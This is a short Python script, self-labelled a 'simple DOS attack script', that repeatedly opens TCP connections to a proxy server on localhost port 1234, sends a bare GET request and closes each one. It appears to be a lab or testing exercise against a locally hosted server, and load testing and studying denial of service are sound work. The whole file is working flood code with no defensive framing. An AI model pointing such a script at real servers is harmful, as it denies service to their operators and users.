# simple DOS attack script
#
# Opens a bunch of TCP connections to proxy server
# and sends simple GET request and immediately closes

import socket, sys

print ("[ Attacking locally hosted proxy server ]")

def flood(target_IP, dst_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((target_IP, dst_port)) 
    str1 = "GET /apache HTTP/1.1\r\n"
    print (">> GET /apache HTTP/1.1")
    s.send(str1.encode()) 
    str2 = "Host: " + target_IP + "\r\n\r\n"
    s.send(str2.encode()); 
    s.close() 

# commence attack 
for i in range(1, 100): 
    flood("localhost", 1234)